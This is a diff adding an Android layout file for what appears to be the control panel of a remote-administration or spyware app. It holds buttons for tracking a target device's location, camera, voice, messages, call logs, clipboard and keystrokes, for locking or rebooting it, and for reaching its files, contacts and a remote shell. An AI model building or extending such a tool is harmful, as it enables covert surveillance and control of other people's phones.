@@ -1,0 +1,157 @@
+<?xml version="1.0" encoding="utf-8"?>
+<ScrollView xmlns:android="http://schemas.android.com/apk/res/android"
+    android:layout_width="match_parent"
+    android:layout_height="match_parent"
+    android:background="@color/bg_dark"
+    android:fillViewport="true">
+
+    <LinearLayout
+        android:layout_width="match_parent"
+        android:layout_height="wrap_content"
+        android:orientation="vertical"
+        android:padding="16dp">
+
+        <!-- Header with Back -->
+        <LinearLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:orientation="horizontal"
+            android:gravity="center_vertical">
+
+            <TextView
+                android:id="@+id/btnBack"
+                android:layout_width="42dp"
+                android:layout_height="42dp"
+                android:background="@drawable/bg_feature_btn"
+                android:gravity="center"
+                android:text="&lt;"
+                android:textColor="@color/neon_cyan"
+                android:textSize="20sp"
+                android:textStyle="bold"
+                android:clickable="true"
+                android:focusable="true" />
+
+            <LinearLayout
+                android:layout_width="0dp"
+                android:layout_height="wrap_content"
+                android:layout_weight="1"
+                android:layout_marginStart="14dp"
+                android:orientation="vertical">
+
+                <TextView
+                    android:id="@+id/deviceName"
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="DEVICE"
+                    android:textColor="@color/text_primary"
+                    android:textSize="20sp"
+                    android:textStyle="bold" />
+
+                <TextView
+                    android:id="@+id/deviceStatus"
+                    android:layout_width="wrap_content"
+                    android:layout_height="wrap_content"
+                    android:text="● ACTIVE"
+                    android:textColor="@color/neon_cyan"
+                    android:textSize="11sp"
+                    android:textStyle="bold" />
+            </LinearLayout>
+        </LinearLayout>
+
+        <Space android:layout_height="24dp" />
+
+        <!-- MONITORING SECTION -->
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="⦿ MONITORING"
+            android:textColor="@color/neon_cyan"
+            android:textSize="10sp"
+            android:textStyle="bold"
+            android:letterSpacing="3" />
+
+        <Space android:layout_height="10dp" />
+
+        <GridLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:columnCount="4"
+            android:orientation="horizontal">
+
+            <TextView android:id="@+id/btnFeatureLocation" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_location" android:text="LOCATION" />
+            <TextView android:id="@+id/btnFeatureCCTV" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_cctv" android:text="CCTV" />
+            <TextView android:id="@+id/btnFeatureVoice" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_voice" android:text="VOICE" />
+            <TextView android:id="@+id/btnFeatureMessages" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_msg" android:text="MESSAGES" />
+            <TextView android:id="@+id/btnFeatureAppUsage" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_usage" android:text="APP USAGE" />
+            <TextView android:id="@+id/btnFeatureHistory" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_history" android:text="HISTORY" />
+            <TextView android:id="@+id/btnFeatureCallLogs" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_call" android:text="CALL LOGS" />
+            <TextView android:id="@+id/btnFeatureSIM" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_sim" android:text="SIM CARD" />
+            <TextView android:id="@+id/btnFeatureClipboard" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_clip" android:text="CLIPBOARD" />
+            <TextView android:id="@+id/btnFeatureKeylog" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_key" android:text="KEYLOGGER" />
+            <TextView android:id="@+id/btnFeatureBattery" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_batt" android:text="BATTERY" />
+            <TextView android:id="@+id/btnFeatureNetwork" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_wifi" android:text="WiFi" />
+
+        </GridLayout>
+
+        <Space android:layout_height="20dp" />
+
+        <!-- CONTROL SECTION (NEON PINK) -->
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="⦿ CONTROL"
+            android:textColor="@color/neon_magenta"
+            android:textSize="10sp"
+            android:textStyle="bold"
+            android:letterSpacing="3" />
+
+        <Space android:layout_height="10dp" />
+
+        <GridLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:columnCount="4"
+            android:orientation="horizontal">
+
+            <TextView android:id="@+id/btnFeatureLock" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_lock" android:text="LOCK" />
+            <TextView android:id="@+id/btnFeatureFlash" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_flash" android:text="FLASHLIGHT" />
+            <TextView android:id="@+id/btnFeatureRing" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_ring" android:text="RING" />
+            <TextView android:id="@+id/btnFeatureReboot" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_reboot" android:text="REBOOT" />
+            <TextView android:id="@+id/btnFeatureShutdown" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_power" android:text="SHUTDOWN" />
+            <TextView android:id="@+id/btnFeatureBurst" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_burst" android:text="BURST" />
+            <TextView android:id="@+id/btnFeatureRecord" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_record" android:text="RECORD" />
+            <TextView android:id="@+id/btnFeatureNotify" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_notify" android:text="NOTIFY" />
+
+        </GridLayout>
+
+        <Space android:layout_height="20dp" />
+
+        <!-- ACCESS SECTION (NEON YELLOW) -->
+        <TextView
+            android:layout_width="wrap_content"
+            android:layout_height="wrap_content"
+            android:text="⦿ ACCESS"
+            android:textColor="@color/neon_yellow"
+            android:textSize="10sp"
+            android:textStyle="bold"
+            android:letterSpacing="3" />
+
+        <Space android:layout_height="10dp" />
+
+        <GridLayout
+            android:layout_width="match_parent"
+            android:layout_height="wrap_content"
+            android:columnCount="4"
+            android:orientation="horizontal">
+
+            <TextView android:id="@+id/btnFeatureFiles" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_files" android:text="FILES" />
+            <TextView android:id="@+id/btnFeatureContacts" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_contacts" android:text="CONTACTS" />
+            <TextView android:id="@+id/btnFeatureSession" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_session" android:text="SESSION" />
+            <TextView android:id="@+id/btnFeatureShell" style="@style/FeatureBtn" android:drawableTop="@drawable/ic_feat_shell" android:text="SHELL" />
+
+        </GridLayout>
+
+        <Space android:layout_height="24dp" />
+
+    </LinearLayout>
+</ScrollView>
